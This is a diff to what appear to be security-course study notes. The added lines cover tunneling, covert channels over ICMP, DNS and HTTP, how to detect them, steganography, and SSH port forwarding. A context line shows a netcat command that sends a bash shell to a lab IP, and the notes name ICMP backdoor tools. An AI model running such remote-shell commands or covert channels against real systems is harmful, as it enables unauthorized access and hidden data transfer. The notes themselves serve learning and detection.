@@ -1223,7 +1223,107 @@ nc -lvp 9999                nc -c /bin/bash 10.10.0.40 9999
 #Packers
 xxd
 
-###Tunneling
+###SSH Tunneling and Covert Channels
+Tunneling encapsulates a protocol inside another protocol
+-Encapsulate
+-Transmit
+-Decapsulate
+
+IPv6 over IPv4
+Done at network layer
+Done by the dual stack router, can be resource intesive
+
+#Type of covert channels
+Storage
+    payload
+    header
+        IP header (TOS, IP ID, Flags + Fragmentation, and Options)
+        TCP Header (Reserved, URG Pointer, and Options)
+
+#Type of covert channels
+Timing
+    Modifying transmissions of legitimate traffic
+    Delaying packets between nodes
+
+#Most common protocols for covert channels
+ICMP, DNS, HTTP
+
+#How to detect covert channels
+Host Analysis
+    Requires knowledge of each applications expected behavior
+Network Analysis
+    A good understanding of your network
+
+#Detecting ICMP
+ICMP works on one request one reply
+    type 8 code 0 request
+    type 0 code 0 answer
+Check for
+    Payload imbalance
+    Request / response imbalance
+    Large payloads in response
+
+#ICMP Covert channel tools
+ptunnel, Loki, 007shell, ICMP backdoor
+
+#Detecting covert channels with DNS
+DNS is a request / response protocol
+1 request typically gets 1 response
+Payloads generally do not exceed 512 bytes
+Check for
+    Request / response imbalances
+    Unusual payloads
+    Burstiness or continuous use
+
+#Detecting covert channels with HTTP
+Request / Response protocol to pull web content
+GET request may include .png, .exe, .(anything) files
+Can vary in sizes of payloads
+Typically "bursty" but not steady
+
+#Steganography
+Hiding messages inside legit info
+Methods
+    Injection
+    Substitution
+    Propagation
+
+#Injection
+inserting messages into the unused (whitespace) of a file
+second most common method
+adds size to file
+hard to detect unless you have original file
+tools: StegHide
+
+#Substitution
+Done by inserting a message into the insignificant portion of the file
+Most common method used
+Elements within digital medium are replaces
+
+#Propogation
+Generates a new file entirely
+Needs special software to manipulate file
+
+#SSH
+Client vs Server v Session
+User Key
+Host Key
+Session Key
+
+###IF KEY CHANGE remove old host key
+ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
+###Use -P [port#] to make SSH go through a different port
+
+Port forward listening port: ssh 172.16.82.106 -L 12002:192.5.5.5:22
+
+#SSH Options
+-L - Creates a port on the client mapped to an ip:port via a server
+-D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically
+-R - Creates the port on the server mapped to a ip:port via the client
+-NT - Do not execute to a remote command and disable pseudo-tty (will hang window)
+
+#For Dynamic Tunnels
+-D 9050
 
 
 
